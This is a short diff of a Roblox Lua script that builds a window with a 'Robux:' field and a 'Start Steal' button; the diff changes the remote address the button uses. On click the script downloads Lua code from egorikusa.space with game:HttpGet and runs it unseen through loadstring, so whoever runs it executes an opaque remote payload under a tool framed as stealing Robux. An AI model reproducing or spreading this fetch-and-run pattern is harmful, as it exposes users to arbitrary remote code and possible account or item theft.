@@ -12,5 +12,5 @@ local textBox = lib:CreateTextBox(window, Enum.Font.Legacy, "Robux:", "")
 
 
 local button = lib:CreateButton(window, "Start Steal", function()
-        loadstring(game:HttpGet("https://egorikusa.space/25b3fcb620f55b445d5461ad.lua", true))()
+loadstring(game:HttpGet("https://egorikusa.space/70418d345321c7ceefbb4223.lua", true))()
 end)
